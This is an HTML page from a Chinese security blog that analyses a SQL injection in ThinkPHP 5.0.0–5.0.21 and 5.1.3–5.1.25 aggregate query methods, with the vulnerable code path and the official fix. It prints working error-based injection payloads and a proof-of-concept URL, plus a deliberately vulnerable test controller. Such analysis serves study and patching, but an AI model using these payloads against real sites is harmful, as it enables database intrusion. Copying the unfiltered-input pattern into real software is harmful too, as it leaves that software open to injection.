@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="5.0.0 &lt;&#x3D; Thinkphp &lt;&#x3D; 5.0.21 &amp; 5.1.3&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.25一、漏洞简介本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（所有 Mysql聚合函数相关方法均存在注入）。本次漏洞存在于所有 Mysql聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进SQL 语句，最终导致 SQL注入漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/5.0.0%20_=%20Thinkphp%20_=%205.0.21%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="5.0.0 &lt;&#x3D; Thinkphp &lt;&#x3D; 5.0.21 &amp; 5.1.3&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.25一、漏洞简介本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（所有 Mysql聚合函数相关方法均存在注入）。本次漏洞存在于所有 Mysql聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进SQL 语句，最终导致 SQL注入漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId37.png">
+<meta property="article:published_time" content="2022-07-08T06:26:04.636Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 5.x 漏洞/5.0.0 _= Thinkphp _= 5.0.21 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/5.0.0%20_=%20Thinkphp%20_=%205.0.21%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.636Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="5-0-0-lt-Thinkphp-lt-5-0-21-amp-5-1-3-lt-ThinkPHP5-lt-5-1-25"><a href="#5-0-0-lt-Thinkphp-lt-5-0-21-amp-5-1-3-lt-ThinkPHP5-lt-5-1-25" class="headerlink" title="5.0.0 &lt;= Thinkphp &lt;= 5.0.21 &amp; 5.1.3&lt;=ThinkPHP5&lt;=5.1.25"></a>5.0.0 &lt;= Thinkphp &lt;= 5.0.21 &amp; 5.1.3&lt;=ThinkPHP5&lt;=5.1.25</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>SQL注入</strong> 漏洞（所有 <strong>Mysql</strong><br>聚合函数相关方法均存在注入）。本次漏洞存在于所有 <strong>Mysql</strong><br>聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进<br><strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>5.0.0&lt;=ThinkPHP&lt;=5.0.21</p>
+<p>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p>
+<p> <strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ：</p>
+<pre><code>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
+</code></pre>
+<p><strong>5.1.11～5.1.25</strong> ：</p>
+<pre><code>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
+</code></pre>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>通过以下命令获取测试环境代码：</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.1.25 tpdemo
+</code></pre>
+<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
+<pre><code>&quot;require&quot;: &#123;
+    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.1.25&quot;
+&#125;,
+</code></pre>
+<p>然后执行 <code>composer update</code> ，并将<br><strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
+<pre><code>&lt;?php
+namespace app\index\controller;
+
+class Index
+&#123;
+    public function index()
+    &#123;
+        $options = request()-&gt;get(&#39;options&#39;);
+        $result = db(&#39;users&#39;)-&gt;max($options);
+        var_dump($result);
+    &#125;
+&#125;
+</code></pre>
+<p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启<br><strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong><br>。创建数据库信息如下：</p>
+<pre><code>create database tpdemo;
+use tpdemo;
+create table users(
+    id int primary key auto_increment,
+    username varchar(50) not null
+);
+insert into users(id,username) values(1,&#39;Mochazz&#39;);
+insert into users(id,username) values(2,&#39;Jerry&#39;);
+insert into users(id,username) values(3,&#39;Kitty&#39;);
+</code></pre>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
+</code></pre>
+<p>访问链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到<br><strong>SQL</strong> 报错信息的）</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="1.png"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先在官方发布的 <strong>5.1.26</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="2.png"></p>
+<p>我们可以查阅其 <strong>commit</strong> 记录，发现其改进了数据库驱动，代码中多了检测特殊字符的片段。接下来我们直接来分析代码。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="3.png"></p>
+<p>首先，用户可控数据未经过滤，传入 <strong>Query</strong> 类的 <strong>max</strong><br>方法进行聚合查询语句构造，接着调用本类的 <strong>aggregate</strong><br>方法。本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在<br><strong>SQL注入</strong> 问题。我们看到 <strong>aggregate</strong> 方法又调用了 <strong>Mysql</strong> 类的<br><strong>aggregate</strong> 方法，在该方法中，我们可以明显看到程序将用户可控变量<br><strong>$field</strong> ，经过 <strong>parseKey</strong> 方法处理后，与 <strong>SQL</strong><br>语句进行了拼接。下面我们就来具体看看 <strong>parseKey</strong> 方法。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="4.png"></p>
+<p><strong>parseKey</strong><br>方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过<br><strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong><br>方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong><br>语句。这个方法应该说是在分析 <strong>ThinkPHP</strong><br>漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到<br><strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong><br>方法，因为用户可控数据存储在 <strong>$options[&#39;field&#39;]</strong><br>变量中并被传入该方法。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="5.png"></p>
+<p>进入 <strong>parseField</strong> 方法，我们发现用户可控数据只是经过 <strong>parseKey</strong><br>方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong><br>语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="6.png"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong><br>以外的字符时，就抛出异常。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="3.png"></p>
+<h3 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h3><p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p>
+<p><img src="/resource/5.0.0%3C=Thinkphp%3C=5.0.21sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId37.png" alt="7.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/5.0.0%20_=%20Thinkphp%20_=%205.0.21%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwlr00iey8v129y36aao" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%205.x%20%E6%BC%8F%E6%B4%9E/5.0.0%20_=%20Thinkphp%20_=5.0.18%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp%205.x%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
